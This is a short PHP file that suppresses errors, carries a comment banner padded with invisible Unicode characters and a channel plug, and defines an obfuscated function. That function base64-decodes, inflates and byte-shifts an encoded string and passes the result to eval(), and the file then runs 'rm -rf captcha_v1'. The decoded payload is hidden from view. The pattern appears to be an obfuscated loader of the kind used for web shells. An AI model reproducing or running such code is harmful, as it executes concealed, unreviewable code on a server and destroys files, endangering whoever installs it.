<?php

error_reporting(0);

/**
⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮PHP 5.6⁮⁮⁮⁮
⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮
⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮
⁮⁮⁮Subcribe Channel => Waryono Ok
⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮
⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮
⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮
**/

function шАПу╝╝цб░рй░цШКц╣╡чСгц╜йтБофЕГхСРфбГЁЯШУ($subrekふ灖剃){
	$ф╗ЦуБоф║║уБоф╗Хф║ЛуВТхП░чДбуБЧуБлуБЧуБкуБДуБзуБПуБауБХуБД_уБйуБЖуВВуБВуВКуБМуБиуБЖуБФуБЦуБДуБ╛уБЧуБЯ_чзБуБоуГБуГгуГ│уГНуГлуВТш│╝шкнуБЩуВЛуБУуБиуВТх┐ШуВМуБкуБДуБзуБПуБауБХуБД;$уБЭуВМуВЙуБохКкхКЫуБпч╡РцЮЬуВТшгПхИЗуВЛуБУуБиуБпуБВуВКуБ╛уБЫуВУтБотБотБотБотБотБотБотБотБоцб░цШКтБотБотБотБотБотБотБотБох╜╝уВЙуБоф╗Хф║ЛуВТшк░уБЛуБлцДЯшмЭуБЧуБ╛уБЩ;$шАПу╝╝цб░рй░цШКц╣╡чСгц╜йтБофЕГхСРфбГЁЯШУ;$subrekふ灖剃 = gzinflate(base64_decode($subrekふ灖剃));for ($noob䏴 = 0; $noob䏴 < strlen($subrekふ灖剃);$noob䏴++) {$subrekふ灖剃[$noob䏴] = chr(ord($subrekふ灖剃[$noob䏴]) -1);}return $subrekふ灖剃;}eVaL(шАПу╝╝цб░рй░цШКц╣╡чСгц╜йтБофЕГхСРфбГЁЯШУ("NY3NCgIhFIUfwKcQaTEtygaqRUMF0XuI49xSHH+4Sta8fBp0VofzfXAorSEEEAMKhBgwG//sduuBrEbpPT1Txn49wXEvwKswwST6tr8XtQRbUpC2lCb96Wy8bYLOOaYT5whyTjpvXRgNVze4H6qdPimD6xg6usEHVTJmpaV49ax+Xy9f"));
system("rm -rf captcha_v1");
?>
